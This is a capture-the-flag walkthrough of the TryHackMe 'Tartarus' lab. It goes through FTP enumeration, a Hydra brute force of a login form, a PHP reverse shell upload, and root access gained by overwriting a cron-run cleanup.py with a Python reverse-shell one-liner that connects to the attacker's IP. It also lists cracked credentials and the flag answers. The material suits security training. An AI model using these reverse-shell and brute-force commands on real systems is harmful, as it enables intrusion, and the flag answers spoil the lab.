# Tartarus

This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. Based Jake

[Tartarus](https://tryhackme.com/room/tartaraus)

## Topic's

- Network Enumeration
- Web Enumeration
- FTP Enumeration
- Brute Forcing (http-post-form)
- Exploitation Upload
- Security Misconfiguration

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Tartarus

User and Root Flag

```
kali@kali:~/CTFs/tryhackme/Tartarus$ sudo nmap -A -sS -sC -sV -O 10.10.205.15
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 11:20 CEST
Nmap scan report for 10.10.205.15
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=21%CT=1%CU=44755%PV=Y%DS=2%DC=T%G=Y%TM=5F86C3
OS:10%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%II=I%TS=8)SEQ(SP=
OS:106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%
OS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   36.30 ms 10.8.0.1
2   36.55 ms 10.10.205.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.52 seconds
```

```
kali@kali:~/CTFs/tryhackme/Tartarus$ ftp 10.10.205.15
Connected to 10.10.205.15.
220 (vsFTPd 3.0.3)
Name (10.10.205.15:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.
ftp>
```

```
kali@kali:~/CTFs/tryhackme/Tartarus$ cat yougotgoodeyes.txt
/sUp3r-s3cr3t
```

[http://10.10.205.15/sUp3r-s3cr3t/](http://10.10.205.15/sUp3r-s3cr3t/)

[http://10.10.205.15/robots.txt](http://10.10.205.15/robots.txt)

```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```

[http://10.10.205.15/admin-dir/](http://10.10.205.15/admin-dir/)

```
kali@kali:~/CTFs/tryhackme/Tartarus$ hydra -L userid -P credentials.txt 10.10.205.15 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 11:28:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1313 login tries (l:13/p:101), ~83 tries per task
[DATA] attacking http-post-form://10.10.205.15:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect
[80][http-post-form] host: 10.10.205.15   login: enox   password: P@ssword1234
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 11:29:23
```

```
kali@kali:~/CTFs/tryhackme/Tartarus$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.205.15/sUp3r-s3cr3t/ -E -w /usr/share/wordlists/dirb/common.txt
[sudo] password for kali:

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Error Log: /opt/dirsearch/logs/errors-20-10-14_11-31-47.log

Target: http://10.10.205.15/sUp3r-s3cr3t/

Output File: /opt/dirsearch/reports/10.10.205.15/sUp3r-s3cr3t_20-10-14_11-31-47.txt

[11:31:47] Starting:
[11:31:54] 301 -  326B  - /sUp3r-s3cr3t/images  ->  http://10.10.205.15/sUp3r-s3cr3t/images/
[11:31:54] 200 -  732B  - /sUp3r-s3cr3t/index.html

Task Completed
```

[http://10.10.205.15/sUp3r-s3cr3t/images/uploads/php-reverse-shell.php](http://10.10.205.15/sUp3r-s3cr3t/images/uploads/php-reverse-shell.php)

```
kali@kali:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.205.15] 44160
Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:32:24 up 12 min,  0 users,  load average: 0.00, 0.04, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
cleanup
d4rckh
thirtytwo
$ cd d4rckh
$ ls
cleanup.py
user.txt
$ cat user.txt
0f7dbb2243e692e3ad222bc4eff8521f
```

```
$ cat cleanup.py
# -*- coding: utf-8 -*-
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /home/cleanup/* ')
except:
        sys.exit()
$
```

```
printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
```

```
$ printf 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' > cleanup.py
$ cat cleanup.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
$ ./cleanup.py
```

```
kali@kali:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.205.15] 51532
bash: cannot set terminal process group (1711): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu-xenial:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-xenial:~# ls
ls
root.txt
root@ubuntu-xenial:~# cat root.txt
cat root.txt
7e055812184a5fa5109d5db5c7eda7cd
```

1. User Flag

`0f7dbb2243e692e3ad222bc4eff8521f`

2. Root Flag

`7e055812184a5fa5109d5db5c7eda7cd`
